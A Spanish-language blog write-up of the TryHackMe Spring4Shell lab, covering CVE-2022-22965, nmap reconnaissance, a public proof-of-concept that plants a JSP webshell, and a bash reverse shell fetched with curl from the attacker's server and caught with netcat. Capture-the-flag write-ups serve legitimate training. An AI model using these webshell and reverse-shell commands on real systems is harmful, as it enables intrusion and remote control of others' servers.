---
layout: single
author: Bast1ant1c
title: THM Spring4Shell
excerpt: "Vamos a resolver la maquina Spring4SHell de TryHackMe. ¡Let's hack!"
date: 2022-04-11
classes: wide
header:
  teaser: /assets/images/spring4shell/inicio.png
  teaser_home_page: true
categories:
  - TryHackMe
tags:
  - Writeup
  - Spring4shell
---

<p align="center">
<img src="/assets/images/spring4shell/inicio.png">
</p>

¡Hola!
En esta ocasión vamos a hablar de la maquina **Spring4shell**. 

[TryHackMe](https://tryhackme.com/) lanzó hace unas semanas esta máquina para aprender acerca de una de las vulnerabilidades más sonadas del momento.

El impacto de la vulnerabilidad asciende al nivel de que, [piratas informáticos](https://backtrackacademy.com/articulo) sacaron provecho de este acontecimiento para ejecutar el malware de botnet MIRAI en Singapur, descargando el programa malicioso en la carpeta `/tmp` y ejecutarlo, luego de un cambio de permisos bajo el comando `chmod`.

Vamos a ver un poco de la vulnerabilidad, limitaciones, explotación y remediaciones.

## VULNERABILIDAD

En marzo de 2022 se hace [pública](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965) la vulnerabilidad de **ejecución remota de comandos** en el marco de Java Spring, específicamente en `Spring Cloud Functions` y `Spring Core`, generando un gran impacto en el framework.

El mundo de **Spring Framework** presenta una vulnerabilidad de ejecución remota de comandos, a través de una _webshell_ la cual es posible luego de forzar a escribir un archivo de extensión `.jsp` en el servidor web.

El principal **riesgo** de el éxito en la explotación de esta vulnerabilidad se presenta en el potencial _escalamiento de privilegios_ para lograr un acceso total al servidor víctima y a la infraestructura de la organización afectada por el ataque.

## LIMITACIONES

Las condiciones para poder explotar la vulnerabilidad **Spring4shell** son las siguientes:

* JDK 9+.
* Spring Framework (<5.2 / 5.2.0-19 / 5.3.0-17).
* Apache Tomcat como servidor de Spring, empaquetado como WAR.
* Las dependencias spring-webmvc y/o spring-webflux como componentes del marco de Spring.
* Uso de hacktools.

## EXPLOTACIÓN

Para realizar la máquina, creamos un directorio y a su vez subdirectorios para organizar la información necesaria.

```zsh
❯ mkdir spring4shell
❯ cd !$
cd spring4shell
❯ mkdir nmap exploit
```

Realizamos un **reconocimiento** por medio de ping, identificando por el TTL (Time To Live) que la maquina es _Linux_.

```zsh
❯ ping -c 1 10.10.25.142
PING 10.10.25.142 (10.10.25.142) 56(84) bytes of data.
64 bytes from 10.10.25.142: icmp_seq=1 ttl=63 time=195 ms

--- 10.10.25.142 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 194.521/194.521/194.521/0.000 ms
```

Hacemos un **escaneo de puertos** para detectar cuales de estos están abiertos para identificar vulnerabilidades en los mismos.

```zsh
❯ sudo nmap -p- --open -sS --min-rate 5000 10.10.25.142 -n -Pn -oG inicial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 09:28 -05
Nmap scan report for 10.10.25.142
Host is up (0.31s latency).
Not shown: 52759 filtered tcp ports (no-response), 12773 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

Luego de identificar los puertos **22**, **80** y **8080**, se procede a detectar servicios y versiones activos.

```zsh
❯ sudo nmap -p22,80,8080 -sCV 10.10.25.142 -n -Pn -oG servicios
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 09:35 -05
Nmap scan report for 10.10.25.142
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0c:92:70:6c:b6:df:1f:0b:45:ed:42:8d:b6:38:cc:67 (RSA)
|   256 18:af:36:34:c9:2e:a4:6f:7a:27:31:e8:ef:6c:84:fb (ECDSA)
|_  256 78:a6:1c:8a:16:5e:a6:29:29:a9:99:d0:66:9c:5e:06 (ED25519)
80/tcp   open  http    nginx 1.20.2
|_http-title: Vulnerable
|_http-server-header: nginx/1.20.2
8080/tcp open  http    nginx 1.20.2
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1260  03-Apr-2022 02:30  exploit.zip
|_
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.20.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el navegador accedemos a la IP bajo el puerto 8080 y procedemos a descargar el archivo **exploit.zip**.

<p align="center">
<img src="/assets/images/spring4shell/exploitzip.png">
</p>

Movemos el archivo a nuestra carpeta y procedemos a descomprimir el archivo con la utilidad `unzip`.

```zsh
❯ mv ~/Descargas/firefox/exploit.zip .
❯ unzip exploit.zip
Archive:  exploit.zip
[exploit.zip] exploit.py password: 
  inflating: exploit.py              
❯ ls
 exploit.py   exploit.zip
```

La información del script descargado se puede obtener ingresando al GitHub de [BobTheShoplifter](https://github.com/BobTheShoplifter/Spring4Shell-POC).

Procedemos a ver el funcionamiento del script.

```python
❯ python3 exploit.py
usage: exploit.py [-h] [-f FILENAME] [-p PASSWORD] [-d DIRECTORY] url
exploit.py: error: the following arguments are required: url
```

Ahora ejecutamos el script con la URL victima (_FILENAME_, _PASSWORD_ y _DIRECTORY_ son opcionales).

```python
❯ python3 exploit.py http://10.10.25.142/
Shell Uploaded Successfully!
Your shell can be found at: http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=whoami
```

Como indica la salida del script, la webshell ha sido cargada en el servidor con éxito, por lo tanto, ya tenemos la **capacidad** de ejecutar comandos de manera remota.

<p align="center">
<img src="/assets/images/spring4shell/vulnerable.png">
</p>
<p align="center">
<img src="/assets/images/spring4shell/intrusion.png">
</p>

Ahora vamos a subir una **reverseshell** para ganar acceso a la maquina!

Crearemos un archivo `shell.sh`.

```zsh
nano shell.sh

#!/bin/bash
bash -i >& /dev/tcp/10.9.3.40/1234 0>&1
```

Luego de crear el archivo, vamos a cargar este al servidor vulnerable, por medio de un servidor local de python.

```zsh
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ejecutaremos en el navegador la siguiente **URL** para cargar nuestra shell en la carpeta `/tmp` de la víctima.

* http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=curl http://10.9.3.40:8000/shell.sh -o /tmp/shell.sh

<p align="center">
<img src="/assets/images/spring4shell/shell.png">
</p>

Nuestra shell se encuentra ahora en el servidor vulnerable!

Vamos a ponernos en escucha con la utilidad netcat, en esta ocasión bajo el puerto **1234**.

```zsh
❯ nc -lvnp 1234
listening on [any] 1234 ...
```

Procedemos a ejecutar el archivo en el servidor víctima.

* http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=bash /tmp/shell.sh

<p align="center">
<img src="/assets/images/spring4shell/admin.png">
</p>

Como se puede ver en la imagen anterior, hemos logrado obtener una **shell** en la maquina! 

Ahora vamos a realizar un _tratamiento_ de la TTY, para lograr una mayor fluidez en la consola, para ello vamos a ejecutar los siguientes comandos iniciando en la maquina víctima.

```zsh
script /dev/null -c bash
^Z
stty raw -echo; fg
reset
xterm
export XTERM=xterm
export SHELL=bash
```

Luego de que logramos una terminal fluida, vamos a buscar la **flag** y leerla!

En esta ocasión solo tenemos una **flag**.

Solo mostraré los primeros 10 dígitos de está.

```zsh
root@spring4shell:/# ls /root
flag.txt
root@spring4shell:/# head -c 10 /root/flag.txt ; echo
THM{NjAyNz
```

**¡Ya está!** 

<p align="center">
<img src="/assets/images/spring4shell/finish.png">
</p>


Por último, les recomiendo **actualizar** sus frameworks de Spring o generar controles pertinentes para que sus sistemas no sean vulnerables!

_¡Que tengan un buen día en el planeta donde se encuentren!_

**Nos vemos en otro bit.**
